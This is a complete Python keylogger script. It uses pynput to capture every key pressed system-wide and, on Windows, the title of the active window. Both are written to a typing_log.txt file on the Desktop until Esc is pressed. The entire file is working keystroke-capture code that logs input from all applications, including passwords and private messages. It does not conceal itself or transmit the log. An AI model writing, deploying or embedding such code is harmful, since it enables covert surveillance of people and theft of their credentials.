import os
import time
import platform
import ctypes
from pynput import keyboard

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
output_file = os.path.join(desktop_path, "typing_log.txt")

def get_active_window_title():
    active_window_title = None

    if platform.system() == "Windows":
        try:
            active_window = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(active_window) + 1
            buffer = ctypes.create_unicode_buffer(length)
            ctypes.windll.user32.GetWindowTextW(active_window, buffer, length)
            active_window_title = buffer.value
        except Exception as e:
            print(f"Failed to get active window title: {str(e)}")

    return active_window_title

def on_press(key):
    active_window_title = get_active_window_title()
    if active_window_title:
        with open(output_file, 'a') as f:
            f.write(f"[Browser: {active_window_title}]\n")
            f.write(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Create a keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
